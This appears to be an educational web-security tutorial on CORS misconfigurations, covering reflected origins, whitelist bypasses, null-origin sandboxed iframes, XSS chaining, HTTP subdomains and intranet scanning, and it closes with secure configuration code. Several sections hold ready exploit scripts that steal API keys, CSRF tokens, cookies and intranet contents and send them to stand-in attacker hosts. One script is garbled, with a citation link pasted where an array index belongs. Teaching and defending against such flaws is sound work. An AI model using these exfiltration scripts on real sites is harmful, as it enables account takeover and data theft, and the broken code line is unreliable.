# Cross-Origin Resource Sharing (CORS)

Cross-origin resource sharing (CORS) is a browser mechanism that extends the same-origin policy (SOP) by allowing servers to explicitly declare which external origins are permitted to read their responses — but when misconfigured, it transforms a security mechanism into an attack vector, enabling malicious websites to make authenticated cross-origin requests and read sensitive response data that the SOP was specifically designed to protect. Unlike CSRF, which exploits the fact that browsers send cookies with cross-origin requests, CORS vulnerabilities are about reading cross-origin responses — CORS misconfigurations grant attackers the bidirectional access (send request AND read response) that the same-origin policy normally blocks, making them particularly dangerous for stealing API keys, CSRF tokens, account data, and any other sensitive information returned by authenticated endpoints. The most critical CORS vulnerabilities arise not from the CORS mechanism itself but from the implementation mistakes developers make while configuring it: dynamically reflecting any Origin header without validation, whitelisting the null origin, using naive regex or substring matching on origin whitelists, and trusting HTTP subdomains in an otherwise HTTPS application — each creating a distinct exploitation pathway that attackers can leverage to exfiltrate sensitive data from authenticated users. 

The core danger: **CORS misconfigurations don't just allow requests to be sent — they allow cross-origin responses to be read, giving attackers the bidirectional channel needed to steal sensitive data from authenticated users**.

## Same-Origin Policy Foundations

### What is the Same-Origin Policy (SOP)?

**Definition and purpose:**

```
Same-Origin Policy (SOP):
Browser security mechanism that prevents JavaScript on one origin
from reading responses from a different origin

Origin = scheme + hostname + port
https://example.com:443 = one origin

SOP two key rules:
1. Cross-origin requests CAN be sent (browser sends them)
2. Cross-origin responses CANNOT be read (browser blocks JavaScript access)

Example:
JavaScript on https://attacker.com makes:
fetch('https://bank.com/account-balance')
→ Browser sends the request (bank.com receives it!)
→ Browser receives the response
→ JavaScript CANNOT read the response (SOP blocks this)
→ Attacker cannot see the account balance

Without SOP:
Any website could silently read your bank balance,
email, social media data, etc. just by making requests
```

**What SOP allows and blocks:**

```
SOP ALLOWS cross-origin:
✓ Link navigation (<a href>)
✓ Form submissions (<form action>)
✓ Embedding images (<img src>)
✓ Embedding scripts (<script src>)
✓ Embedding stylesheets (<link rel="stylesheet">)
✓ Embedding iframes (<iframe src>)
✓ Sending requests via fetch/XHR

SOP BLOCKS cross-origin:
✗ Reading response body via JavaScript
✗ Reading response headers via JavaScript
✗ Reading canvas content drawn from cross-origin images
✗ Reading iframe content from different origin
✗ Accessing local storage of different origin

The critical gap CORS addresses:
Legitimate applications genuinely need to read cross-origin responses
(e.g., frontend at app.com reading API at api.com)
SOP was too restrictive for modern web architecture
```

**Why SOP alone is insufficient for modern applications:**

```
Modern architecture that SOP breaks:
Single Page Application (SPA):
  Frontend: https://app.example.com
  Backend API: https://api.example.com
  → Cross-origin! SOP blocks API responses from being read!

Microservices:
  Web app: https://example.com
  Auth service: https://auth.example.com
  Payment service: https://pay.example.com
  → All cross-origin! SOP blocks everything!

Third-party integrations:
  App: https://mysite.com
  Analytics: https://analytics.provider.com/data
  → Cross-origin! SOP blocks response reading!

Solution: CORS headers allow selected cross-origin response reading
```

## How CORS Works

### The CORS header exchange

**Simple cross-origin request (no preflight):**

```http
Browser sends request with Origin header:
GET /api/user-data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com    ← Browser adds automatically
Cookie: session=TOKEN
Accept: application/json

Server responds with CORS headers:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example.com  ← Server grants permission
Access-Control-Allow-Credentials: true                ← Cookies/auth included
Content-Type: application/json

{"username": "alice", "apiKey": "SECRET_KEY"}

Browser decision:
Does Origin match Access-Control-Allow-Origin? YES
→ JavaScript on app.example.com CAN read this response ✓

If no CORS header / wrong origin in ACAO:
→ Browser blocks JavaScript from reading response ✗
→ Request was still sent and received by server
→ Only the reading is blocked
```

**Preflight request (for complex requests):**

```http
Before sending PUT/DELETE/custom headers:
Browser automatically sends OPTIONS preflight:

OPTIONS /api/update-user HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, X-Custom-Header

Server responds to preflight:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, X-Custom-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400

If server approves preflight:
→ Browser sends actual PUT request
→ Browser can read PUT response

If server rejects preflight:
→ Browser does NOT send actual request
→ "CORS error" in browser console

Simple requests (no preflight needed):
- GET, POST, HEAD only
- Only basic headers
- Content-Type: text/plain, application/x-www-form-urlencoded, multipart/form-data
```

**Key CORS response headers:** 

```http
Access-Control-Allow-Origin: https://trusted.com
  → Which origin can read this response
  → Can be a specific origin or * (wildcard)
  → CANNOT be: * with credentials (browser rejects this)

Access-Control-Allow-Credentials: true
  → Whether cookies and auth headers are included
  → If true: ACAO cannot be * (must be specific origin)
  → Critical for authenticated CORS attacks

Access-Control-Allow-Methods: GET, POST, PUT, DELETE
  → Which HTTP methods are allowed cross-origin
  → Only in preflight responses

Access-Control-Allow-Headers: Content-Type, Authorization
  → Which request headers are allowed
  → Only in preflight responses

Access-Control-Max-Age: 86400
  → How long browser caches preflight result (seconds)
  → Reduces preflight requests

Access-Control-Expose-Headers: X-Custom-Header
  → Which response headers JavaScript can access
  → Only: basic headers (Content-Type etc.) accessible by default
```

## Vulnerability 1: Server-Generated ACAO from Client Origin

### The misconfiguration

**Most common and most dangerous CORS vulnerability:** 

```javascript
// VULNERABLE server code — dynamically reflects Origin without validation
app.use((req, res, next) => {
    const origin = req.headers.origin;
    
    // CRITICAL MISTAKE: No validation — any origin is trusted!
    if (origin) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
    }
    next();
});

// Effect:
// Any origin sends: Origin: https://attacker.com
// Server responds: Access-Control-Allow-Origin: https://attacker.com
//                  Access-Control-Allow-Credentials: true
// Attacker's site can now read all authenticated responses!
```

**HTTP exchange showing the vulnerability:**

```http
Attack request from attacker-controlled script:
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=VICTIM_SESSION_COOKIE

Vulnerable server response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com  ← Reflected!
Access-Control-Allow-Credentials: true                      ← Credentials allowed!
Content-Type: application/json

{
    "username": "victim_user",
    "email": "victim@example.com",
    "apiKey": "SECRET_API_KEY_HERE",
    "csrfToken": "VALUABLE_CSRF_TOKEN"
}
```

**Exploitation script:**

```javascript
// Hosted on: https://malicious-website.com/exploit

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET', 'https://vulnerable-website.com/sensitive-victim-data', true);
req.withCredentials = true;  // Include victim's session cookie!
req.send();

function reqListener() {
    // This.responseText contains the full response body!
    // (Normally blocked by SOP — CORS misconfiguration enables this)
    location = '//malicious-website.com/log?key=' + this.responseText;
    // Sends stolen data to attacker's server
}
```

**Modern fetch()-based exploit:**

```javascript
// More readable modern equivalent
async function stealData() {
    try {
        const response = await fetch(
            'https://vulnerable-website.com/account/details',
            {
                credentials: 'include',  // Include victim's cookies
                mode: 'cors'             // Explicitly use CORS
            }
        );

        const sensitiveData = await response.json();

        // Exfiltrate to attacker's server
        await fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify({
                apiKey: sensitiveData.apiKey,
                email: sensitiveData.email,
                csrfToken: sensitiveData.csrfToken,
                cookies: document.cookie  // Any accessible cookies too
            })
        });

    } catch (err) {
        // Log error to attacker server
        fetch('https://attacker.com/error?msg=' + err.message);
    }
}

stealData();
```

**Complete attack chain:**

```
Step 1: Identify CORS misconfiguration
GET /account/details HTTP/1.1
Host: vulnerable.com
Origin: https://attacker.com
Cookie: session=TEST_SESSION

Check response for:
Access-Control-Allow-Origin: https://attacker.com  ← Reflected!
Access-Control-Allow-Credentials: true

Step 2: Confirm sensitive data in response
GET /account/details HTTP/1.1
Cookie: session=VALID_SESSION
→ Response contains: apiKey, email, csrfToken, etc.

Step 3: Host exploit page on attacker-controlled domain

Step 4: Deliver exploit to authenticated victim
(Phishing, stored XSS elsewhere, social media, etc.)

Step 5: Victim visits exploit page
→ JavaScript runs on attacker.com
→ Fetch to vulnerable.com with victim's cookies included
→ Vulnerable server reflects Origin → grants access
→ JavaScript reads full response
→ Data exfiltrated to attacker's server

Step 6: Attacker receives stolen data
→ Uses apiKey for direct API access
→ Uses csrfToken to bypass CSRF protections
→ Takes over victim's account
```

## Vulnerability 2: Errors Parsing Origin Headers (Whitelist Bypass)

### Naive whitelist implementation flaws 

**Correct intent, wrong implementation:**

```javascript
// Developer intent: Only allow specific trusted origins
// Mistake: Naive string matching instead of URL parsing

// FLAW 1: suffix match — attackers can prepend attacker subdomain
app.use((req, res, next) => {
    const origin = req.headers.origin;
    
    // BUG: endsWith check
    if (origin && origin.endsWith('normal-website.com')) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
    }
    next();
});

// Bypass: Register: hackersnormal-website.com
// Origin: https://hackersnormal-website.com
// endsWith('normal-website.com') → TRUE!
// Attacker's domain granted access!
```

```javascript
// FLAW 2: prefix match — attackers can append their domain
if (origin && origin.startsWith('https://normal-website.com')) {
    // Bypass: Origin: https://normal-website.com.evil-user.net
    // startsWith('https://normal-website.com') → TRUE!
}
```

```javascript
// FLAW 3: includes/contains — attacker can embed domain anywhere
if (origin && origin.includes('normal-website.com')) {
    // Bypass: Origin: https://evil.com?normal-website.com
    // Bypass: Origin: https://normal-website.com.evil.com
    // Bypass: Origin: https://not-normal-website.com
}
```

```javascript
// FLAW 4: Regex without anchors/escaping
if (origin && /normal-website.com/.test(origin)) {
    // Dot in regex = any character!
    // Bypass: Origin: https://normalXwebsiteYcom.evil.com
    // Matches! (X and Y can be any character due to unescaped dots)
    
    // Also: Origin: https://evilnormal-website.com (no anchor)
}
```

**Bypass examples summary:**

```
Whitelist logic       | Vulnerable domain example | Bypass domain
----------------------|---------------------------|------------------
endsWith(.com)        | normal-website.com        | hackersnormal-website.com
startsWith(https://n) | normal-website.com        | normal-website.com.evil.net
includes(normal)      | normal-website.com        | evil-normal-website.com
regex /normal.com/    | normal-website.com        | normalXcom.attacker.com
```

**Detecting whitelist bypass via Burp Suite:**

```
Step 1: Send request to CORS-protected endpoint
GET /api/sensitive-data HTTP/1.1
Host: normal-website.com
Origin: https://normal-website.com  (legitimate origin)
→ Access-Control-Allow-Origin: https://normal-website.com ✓

Step 2: Test suffix bypass
Origin: https://hackersnormal-website.com
→ If ACAO reflects this: VULNERABLE to suffix bypass!

Step 3: Test prefix bypass
Origin: https://normal-website.com.attacker.com
→ If ACAO reflects this: VULNERABLE to prefix bypass!

Step 4: Test arbitrary origin
Origin: https://completely-different.com
→ If ACAO reflects this: Dynamic reflection (no whitelist at all!)

Step 5: Register matching attack domain
Get domain matching the bypass pattern
Host exploit script at that domain
Deliver to authenticated victims
```

**Safari-specific parser confusion (historical):** 

```http
Some implementations vulnerable to Origin parser confusion:
Origin: https://normal-website.com`.attacker.com

In Safari, the backtick may be treated as delimiter
Server might parse hostname as normal-website.com
And reflect it as trusted origin

Result: Attacker at attacker.com gains CORS access
by exploiting hostname parsing differences

Testing: Send Origin with unusual characters
→ URL-encoded variants
→ Backtick, spaces, other delimiters
→ Observe whether server reflects or rejects
```

## Vulnerability 3: Whitelisted Null Origin

### What causes null Origins? 

**Browsers send `null` as Origin in specific situations:**

```
Situations triggering null Origin:
1. Redirected cross-origin requests
2. Requests from data: URI pages
3. Requests using file: protocol (local HTML files)
4. Sandboxed iframe cross-origin requests (with sandbox attribute)
5. Serialized data requests (in some browser implementations)

Developer mistake:
"We need to allow local development testing
Local file:// URLs send Origin: null
Let's whitelist null to allow developers to test locally"

Result:
Set-Cookie: session=TOKEN
Server response includes:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
→ Any null Origin request can read responses
→ Attackers can forge null Origin via sandboxed iframes!
```

**Vulnerable server response:**

```http
Attack request with null Origin:
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: null
Cookie: sessionid=VICTIM_SESSION

Vulnerable server response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null    ← Whitelisted!
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"apiKey": "SECRET", "email": "victim@example.com"}
```

### Exploiting null origin via sandboxed iframes 

**Key insight — sandbox attribute forces null Origin:**

```html
<!-- Regular iframe: sends actual origin -->
<iframe src="https://other-site.com">
</iframe>
<!-- Origin of requests: https://other-site.com -->

<!-- Sandboxed iframe with data: URI: sends null Origin -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html, CONTENT HERE">
</iframe>
<!-- The data: URI combined with sandbox → Origin: null -->
<!-- Browser treats sandboxed data: iframes as opaque origin = null -->
```

**Full exploit using sandboxed iframe:**

```html
<!-- Hosted on: https://attacker.com/exploit.html -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
        src="data:text/html,
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    // Response is readable because server trusts null origin!
    location = 'https://attacker.com/log?key=' + encodeURIComponent(this.responseText);
};
req.open('GET', 'https://vulnerable-website.com/sensitive-victim-data', true);
req.withCredentials = true;
req.send();
</script>">
</iframe>
```

```
Attack flow:
1. Victim visits attacker's page
2. Browser loads sandboxed iframe with data: URI content
3. JavaScript inside sandboxed iframe executes
4. JavaScript makes XHR to vulnerable-website.com
5. Browser sends request with Origin: null
   (sandboxed data: URI → opaque origin → null)
6. Vulnerable server checks: is null whitelisted? → YES
7. Server responds:
   Access-Control-Allow-Origin: null
   Access-Control-Allow-Credentials: true
   Body: {sensitive data}
8. iframe's JavaScript can READ the response
   (because ACAO: null matches the null Origin)
9. JavaScript exfiltrates data: location = 'https://attacker.com/log?key=...'
10. Attacker receives victim's sensitive data!
```

**Why null whitelisting happens in development:**

```
Development workflow problem:
Developer opens: file:///Users/dev/project/test.html
JavaScript in this file makes XHR to: https://api.example.com
Browser sends: Origin: null  (file:// protocol → null)
Server rejects: CORS error!
Developer cannot test locally!

Developer "fix":
Add null to CORS whitelist: Access-Control-Allow-Origin: null
Tests now pass! Ships to production...
Now any attacker can exploit null origin in production!

Correct fix for development:
→ Use a local development server (localhost)
→ Configure CORS to allow http://localhost:3000
→ Never whitelist null in production
→ Use environment-specific CORS configuration
```

## Vulnerability 4: CORS Trust + XSS Chain

### Exploiting trusted origins with XSS 

**The trust chain problem:**

```
Correct CORS configuration (but still exploitable):
vulnerable-website.com trusts subdomain.vulnerable-website.com

Server response:
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true

This is "correctly configured" CORS — but:
If subdomain.vulnerable-website.com has XSS →
Attacker injects JavaScript in that subdomain →
JavaScript runs under subdomain.vulnerable-website.com origin →
JavaScript can make credentialed requests to main app →
Responses are readable (CORS allows trusted subdomain) →
Data stolen!

Critical insight:
CORS trust is transitive through vulnerabilities
Trust the origin → trust all vulnerabilities on that origin
```

**HTTP exchange:**

```http
Legitimate CORS request from trusted subdomain:
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=VICTIM_SESSION

Server response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true

{"apiKey": "VICTIM_SECRET_API_KEY"}
```

**Full attack chain using XSS + CORS:** 

```
Preconditions:
1. vulnerable-website.com trusts subdomain.vulnerable-website.com via CORS
2. subdomain.vulnerable-website.com has an XSS vulnerability
   e.g., GET /search?query=[REFLECTED_XSS]

Attack URL to deliver to victim:
https://subdomain.vulnerable-website.com/search?query=
<script>
    fetch('https://vulnerable-website.com/api/requestApiKey', {
        credentials: 'include'
    })
    .then(r => r.text())
    .then(data => {
        fetch('https://attacker.com/steal?d=' + encodeURIComponent(data));
    });
</script>

Attack flow:
1. Victim clicks attacker's link (or attacker uses stored XSS)
2. XSS executes in subdomain.vulnerable-website.com context
3. JavaScript makes credentialed fetch to vulnerable-website.com
4. Request has Origin: https://subdomain.vulnerable-website.com
5. vulnerable-website.com: "Trusted origin? Yes!" → allows + returns data
6. JavaScript reads API key (same origin as ACAO)
7. Exfiltrates to attacker.com

The CORS configuration was "correct" — the XSS is what made it exploitable
```

**Chained attack to steal CSRF token:**

```javascript
// XSS on trusted subdomain → steal CSRF token → perform protected action

async function exploitCorsThroughXss() {
    // Step 1: Make CORS request to fetch account page (contains CSRF token)
    const accountPageResponse = await fetch(
        'https://vulnerable-website.com/my-account',
        { credentials: 'include' }
    );
    const accountPageHtml = await accountPageResponse.text();

    // Step 2: Extract CSRF token from response HTML
    const csrfMatch = accountPageHtml.match(
        /name="csrf-token"\s+value="([^"]+)"/
    );
    const csrfToken = csrfMatch ? csrfMatch [portswigger](https://portswigger.net/web-security/cors) : null;

    // Step 3: Use stolen CSRF token to perform protected action
    if (csrfToken) {
        await fetch('https://vulnerable-website.com/account/change-email', {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `email=attacker@evil.com&csrf-token=${csrfToken}`
        });
    }

    // Step 4: Exfiltrate confirmation
    fetch('https://attacker.com/done?csrf=' + csrfToken);
}

exploitCorsThroughXss();
```

## Vulnerability 5: Breaking TLS with HTTP-Trusted Subdomain

### CORS that degrades HTTPS security 

**The scenario:**

```
Application:
- vulnerable-website.com → strictly HTTPS, all cookies Secure
- trusted-subdomain.vulnerable-website.com → whitelisted in CORS
- BUT: trusted subdomain runs HTTP (not HTTPS)!

Server CORS response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true

The HTTPS application trusts an HTTP origin!
This creates a network interception attack path
```

**Full attack requiring network position:**

```
Attacker requirements:
- Man-in-the-middle position on victim's network
  (Public WiFi, ARP spoofing, rogue access point, ISP-level, etc.)

Step 1: Victim makes any HTTP request
(Could be to any HTTP site, or the subdomain itself)

Step 2: Attacker intercepts HTTP request
(In a position between victim and internet)

Step 3: Attacker injects redirect to trusted HTTP subdomain
HTTP/1.1 307 Temporary Redirect
Location: http://trusted-subdomain.vulnerable-website.com

Step 4: Victim's browser follows redirect to HTTP subdomain

Step 5: Attacker intercepts this HTTP request
(No HTTPS → no encryption → attacker controls response)

Step 6: Attacker returns malicious page with CORS exploit:
HTTP/1.1 200 OK
Content-Type: text/html

<script>
fetch('https://vulnerable-website.com/api/sensitive-data', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
</script>

Step 7: Victim's browser executes script from HTTP subdomain

Step 8: Browser makes CORS request:
GET /api/sensitive-data HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com  ← HTTP!
Cookie: session=VICTIM_SESSION  (Secure cookie still sent — different origin!)

Step 9: vulnerable-website.com checks:
Is http://trusted-subdomain.vulnerable-website.com in whitelist? YES
→ Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
→ Access-Control-Allow-Credentials: true
→ Full sensitive response returned

Step 10: JavaScript reads response → exfiltrated to attacker!
```

**Why this is particularly dangerous:**

```
This attack bypasses:
✓ HTTPS on the main application
✓ Secure flag on session cookies
✓ HSTS (HTTP Strict Transport Security) on main domain
✓ Any other HTTPS security measures

All of these protect the main domain's HTTPS
But none protect against a trusted HTTP subdomain
being compromised via network interception

Result: Robust HTTPS app fully compromised via
one HTTP-accessible subdomain in the CORS whitelist
```

## Vulnerability 6: CORS Without Credentials (Intranet Attacks)

### Exploiting unauthenticated CORS for internal network access 

**The intranet attack scenario:**

```
Most CORS attacks require: Access-Control-Allow-Credentials: true

Without credentials:
- Attacker cannot make authenticated cross-origin requests
- Cannot steal victim's session data
- Only accesses content anyone can access anyway
... or can they?

Special case: Intranet resources
- Internal servers not accessible from public internet
- Only reachable from inside corporate network
- No authentication required on internal network
  (Network location used as access control)
- But employees browse external internet too!

Attack:
1. Employee uses corporate laptop/browser
2. Employee visits attacker's external website
3. JavaScript on attacker's site makes request to intranet URL:
   fetch('http://192.168.1.1/admin')  or
   fetch('http://intranet.company.internal/sensitive-doc')
4. The request comes from EMPLOYEE'S BROWSER
5. Browser IS on internal network
6. Intranet server responds (no auth required — internal!)
7. If CORS is wildcard: Access-Control-Allow-Origin: *
8. Attacker's JavaScript can read the intranet response!
```

**HTTP exchange:**

```http
Cross-origin request to intranet server:
GET /reader?url=doc1.pdf HTTP/1.1
Host: intranet.normal-website.com
Origin: https://evil-website.com
(No credentials — intranet doesn't require auth)

Intranet server (misconfigured) response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *     ← Wildcard! No credentials needed
Content-Type: application/json

{"document": "SENSITIVE_INTERNAL_CONTENT..."}
```

**Intranet enumeration attack:**

```javascript
// Scan internal network from victim's browser via CORS

const internalHosts = [
    'http://192.168.1.1',      // Common router
    'http://192.168.1.100',    // Possible internal server
    'http://10.0.0.1',         // Common router
    'http://intranet.local',
    'http://admin.internal',
    'http://jenkins.company.local',
    'http://confluence.company.local',
    'http://jira.company.local'
];

async function scanIntranet() {
    const results = {};

    for (const host of internalHosts) {
        try {
            const response = await fetch(host, {
                mode: 'cors',
                signal: AbortSignal.timeout(2000)
            });

            // If we get here AND CORS allows it:
            if (response.ok) {
                results[host] = await response.text();
            }
        } catch (e) {
            results[host] = 'unreachable: ' + e.message;
        }
    }

    // Send internal network map to attacker
    fetch('https://attacker.com/intranet-map', {
        method: 'POST',
        body: JSON.stringify(results)
    });
}

scanIntranet();
```

## CORS Vulnerability Detection

### Testing methodology

**Step 1: Identify CORS-enabled endpoints**

```
Look for responses containing:
- Access-Control-Allow-Origin header
- Access-Control-Allow-Credentials header
- Access-Control-Allow-Methods header

Focus on endpoints returning sensitive data:
- /api/user or /api/account
- /api/keys or /api/tokens
- /api/admin
- /api/settings
- Any endpoint with authentication-gated data
```

**Step 2: Probe CORS configuration**

```
Test A: Arbitrary origin reflection
Add: Origin: https://attacker.com
Check: Is it reflected in ACAO?

Test B: Null origin
Add: Origin: null
Check: Is ACAO: null returned?

Test C: Prefix bypass
Add: Origin: https://vulnerable.com.attacker.com
Check: Reflected?

Test D: Suffix bypass
Add: Origin: https://attackervulnerable.com
Check: Reflected?

Test E: Subdomain wildcard
Add: Origin: https://xss.vulnerable.com
Check: Reflected? (Confirms subdomain wildcard policy)

Test F: HTTP subdomain
Add: Origin: http://subdomain.vulnerable.com
Check: Reflected? (HTTP-downgrade vector)
```

**Step 3: Confirm exploitability**

```
Three conditions for critical exploitation:
1. ACAO reflects attacker's origin (or null, or trusted XSS vector)
2. ACAC: Access-Control-Allow-Credentials: true
3. Sensitive data in response body

If conditions 1+2+3 met: High severity — data theft possible
If 1+2 but no sensitive data: Lower severity — confirm data scope
If only 1 but no credentials: Limited impact — only public data
```

## Prevention — How to Secure CORS

### Defence 1: Strict origin allowlisting 

```javascript
// SECURE: Explicit allowlist with proper URL parsing

const ALLOWED_ORIGINS = new Set([
    'https://app.example.com',
    'https://admin.example.com',
    'https://partner-site.com'
]);

app.use((req, res, next) => {
    const origin = req.headers.origin;

    // Only set CORS headers if origin is in our allowlist
    if (origin && ALLOWED_ORIGINS.has(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Vary', 'Origin');  // Critical: vary cache by origin!
    }
    // If origin NOT in allowlist: return no CORS headers
    // → Browser blocks JavaScript from reading response
    // → CORS attack fails

    if (req.method === 'OPTIONS') {
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
        res.setHeader('Access-Control-Max-Age', '86400');
        return res.status(204).end();
    }

    next();
});
```

**Critical: The Vary: Origin header**

```http
Always set: Vary: Origin

Without Vary: Origin:
Request 1: Origin: https://trusted.com
→ Response cached with ACAO: https://trusted.com

Request 2: Origin: https://attacker.com
→ Served from cache!
→ ACAO: https://trusted.com in response to attacker!
→ Confused browsers may allow attacker's script to read cached response

With Vary: Origin:
Each unique Origin value gets its own cache entry
Cache-poisoning via CORS headers prevented
```

### Defence 2: Never reflect Origin dynamically without validation 

```javascript
// These patterns are ALL insecure — NEVER do these:

// Pattern 1: Unconditional reflection
res.setHeader('Access-Control-Allow-Origin', req.headers.origin);  // INSECURE

// Pattern 2: Presence check only
if (req.headers.origin) {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);  // INSECURE
}

// Pattern 3: Weak suffix check
if (origin.endsWith('.example.com')) {
    res.setHeader('Access-Control-Allow-Origin', origin);  // INSECURE
}

// Pattern 4: Unescaped regex
if (/example\.com$/.test(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    // Still insecure: attackerexample.com would match with .* prefix
}

// SECURE: Parse URL and check exact hostname
function isOriginAllowed(origin) {
    try {
        const url = new URL(origin);
        return (
            url.protocol === 'https:' &&           // Must be HTTPS
            (url.hostname === 'example.com' ||       // Exact match
             url.hostname.endsWith('.example.com'))  // Valid subdomain
        );
    } catch {
        return false;  // Invalid URL → reject
    }
}
```

### Defence 3: Avoid whitelisting null 

```javascript
// NEVER do this:
if (origin === 'null') {
    res.setHeader('Access-Control-Allow-Origin', 'null');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
}

// Why it's dangerous:
// Attacker can force null Origin via sandboxed iframes
// null origin = attackers from anywhere on the internet!

// For local development: use localhost instead
// Development allowlist:
const DEV_ORIGINS = new Set([
    'http://localhost:3000',
    'http://localhost:8080',
    'http://127.0.0.1:3000'
]);

const PROD_ORIGINS = new Set([
    'https://app.example.com'
]);

const ALLOWED = process.env.NODE_ENV === 'development'
    ? new Set([...PROD_ORIGINS, ...DEV_ORIGINS])
    : PROD_ORIGINS;

// Never include null in either set
```

### Defence 4: Avoid wildcards on internal networks 

```javascript
// NEVER on internal/intranet servers:
res.setHeader('Access-Control-Allow-Origin', '*');

// Why dangerous:
// Internal users browse external web too
// External attacker's page can use employee's browser as proxy
// No credentials needed for unauthenticated intranet content

// Intranet servers should either:
// 1. Have no CORS headers (only same-origin access)
// 2. Have strictly allowlisted origins (known internal apps)

// Example secure internal server CORS:
const INTERNAL_ALLOWED = new Set([
    'https://internal-dashboard.company.com',
    'https://admin.company.com'
]);

// Public API that genuinely needs wildcard:
// ONLY if: no sensitive data + no credentials required
// e.g., public font/icon CDN, public read-only API
res.setHeader('Access-Control-Allow-Origin', '*');
// In this case: NEVER include Access-Control-Allow-Credentials: true
```

### Defence 5: CORS is not a security control 

```
Critical misunderstanding to avoid:
"We have CORS configured so our API is protected"

Reality:
CORS is a browser enforcement mechanism
CORS headers are INSTRUCTIONS TO BROWSERS
Servers/scripts/curl/Postman/Burp IGNORE CORS headers entirely

What CORS does:
Tells compliant browsers whether to let JavaScript read responses

What CORS does NOT do:
- Prevent direct server-to-server requests
- Block API calls from non-browser clients
- Prevent CSRF (forms bypass CORS)
- Authenticate or authorize any requests
- Replace server-side access control

Required alongside CORS:
✓ Proper authentication (session tokens, JWT, API keys)
✓ Server-side authorisation checks
✓ Rate limiting
✓ Input validation
✓ CSRF tokens for state-changing requests

CORS only makes the browser complicit in enforcing
the server's cross-origin access policy —
it has zero effect on any other client
```

**Complete secure CORS implementation:**

```javascript
const express = require('express');
const app = express();

// Strict production allowlist
const ALLOWED_ORIGINS = new Set([
    'https://app.example.com',
    'https://admin.example.com'
]);

// CORS middleware — applied before all routes
app.use((req, res, next) => {
    const origin = req.headers.origin;

    // Validate origin against allowlist
    if (origin && ALLOWED_ORIGINS.has(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Access-Control-Expose-Headers', 'Content-Length');
        res.setHeader('Vary', 'Origin');  // Prevent cache poisoning
    }

    // Handle preflight
    if (req.method === 'OPTIONS') {
        if (origin && ALLOWED_ORIGINS.has(origin)) {
            res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
            res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-CSRF-Token');
            res.setHeader('Access-Control-Max-Age', '600');
        }
        return res.status(204).end();
    }

    next();
});

// STILL require authentication — CORS doesn't replace this!
app.use(requireAuthentication);

// STILL validate CSRF for state-changing requests
app.use(requireCsrfToken);

app.get('/api/sensitive-data', (req, res) => {
    // Server-side authorisation — user can only see their own data
    const data = getUserData(req.user.id);
    res.json(data);
});
```
